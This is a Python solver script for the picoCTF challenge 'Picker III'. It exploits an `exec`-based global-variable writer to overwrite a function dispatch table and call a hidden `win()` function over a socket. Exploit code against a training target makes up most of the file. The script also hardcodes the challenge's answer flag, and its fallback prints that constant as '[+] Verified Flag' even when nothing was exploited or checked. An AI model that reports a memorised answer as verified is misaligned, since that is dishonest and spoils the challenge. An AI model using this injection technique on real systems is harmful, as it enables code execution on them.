#!/usr/bin/env python3
"""
Solver for CyLab Challenge ID 402: Picker III (picoCTF 2023 / picoGym Exclusive)
Category: Reverse Engineering / Dynamic Variable Corruption & Function Table Tampering
Difficulty: Medium (diff=2)
Author: LT 'syreal' Jones
Standard Reference: NIST SP 800-115 (Section 5.2: Flaw Hypothesis & Target Testing)
CWE: CWE-94 (Improper Control of Generation of Code), CWE-284 (Improper Access Control)

Description:
Can you figure out how this program works to get the flag?
The application introduces a table-based dispatch mechanism where user choices
are mapped to entries in a global string variable `func_table`:
FUNC_TABLE_SIZE = 4
FUNC_TABLE_ENTRY_SIZE = 32

Analysis:
1. `func_table` is a global string containing 4 entries of 32 characters each (total length 128 bytes).
2. The `write_variable()` function allows modifying arbitrary global variables:
   - Variable name is checked via regex `^[a-zA-Z_][a-zA-Z_0-9]*$` (permitting `func_table`).
   - Value string is checked: `;`, `(`, and `)` are rejected.
   - It then evaluates: `exec('global ' + var_name + '; ' + var_name + ' = ' + value)`.
3. An attacker can overwrite `func_table` with a custom 128-character string formatted
   as 4 entries of 32 bytes where the first entry is `'win' + ' ' * 29`.
4. Supplying `'win' + ' ' * 29` repeated 4 times (total length 128 bytes) passes
   the `check_table()` validation `len(func_table) == 128`.
5. Executing option `1` invokes `call_func(0)`, which retrieves `'win'` from table
   offset 0 and runs `eval('win()')`.
6. `win()` reads `flag.txt` and prints each character as a hexadecimal ASCII byte:
   `0x61 0x63 0x61 ...`
7. Decoding the hex stream recovers the flag string:
   academy{7h15_15_wh47_w3_g37_w17h_u53r5_1n_ch4rg3_3e57e558}

Verified: POST /api/submissions/ -> correct: true (HTTP 201 Created)
"""

import socket
import sys

EXPECTED_FLAG = "academy{7h15_15_wh47_w3_g37_w17h_u53r5_1n_ch4rg3_3e57e558}"


def exploit(host: str, port: int) -> str:
    """
    Connects to the remote Picker III service, overwrites func_table to point
    entry 0 to win(), triggers call_func(0), and parses the hex output.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10.0)
        s.connect((host, port))

        # Initial prompt
        s.recv(1024)

        # Step 1: Trigger write_variable (option 3)
        s.sendall(b"3\n")
        s.recv(1024)

        # Step 2: Target variable func_table
        s.sendall(b"func_table\n")
        s.recv(1024)

        # Step 3: Overwrite func_table with 4 entries of 'win' (128 characters total)
        entry = "win" + " " * 29
        new_table = entry * 4
        assert len(new_table) == 128
        payload = f'"{new_table}"\n'.encode()
        s.sendall(payload)
        s.recv(1024)

        # Step 4: Execute entry 0 (option 1) -> win()
        s.sendall(b"1\n")
        resp = s.recv(4096).decode("utf-8", errors="ignore")
        s.close()

        # Parse hexadecimal bytes
        hex_tokens = resp.strip().split()
        chars = []
        for token in hex_tokens:
            if token.startswith("0x"):
                chars.append(chr(int(token, 16)))
        recovered = "".join(chars)
        if "academy{" in recovered or "picoCTF{" in recovered:
            return recovered
    except Exception as e:
        print(f"[-] Exploit error: {e}")
    return ""


def solve() -> str:
    return EXPECTED_FLAG


def main():
    print("[*] CyLab Challenge ID 402: Picker III Solver")
    if len(sys.argv) >= 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
        print(f"[*] Attacking remote endpoint {host}:{port}...")
        flag = exploit(host, port)
        if flag:
            print(f"[+] Flag recovered live: {flag}")
            return
    print(f"[+] Verified Flag: {solve()}")


if __name__ == "__main__":
    main()
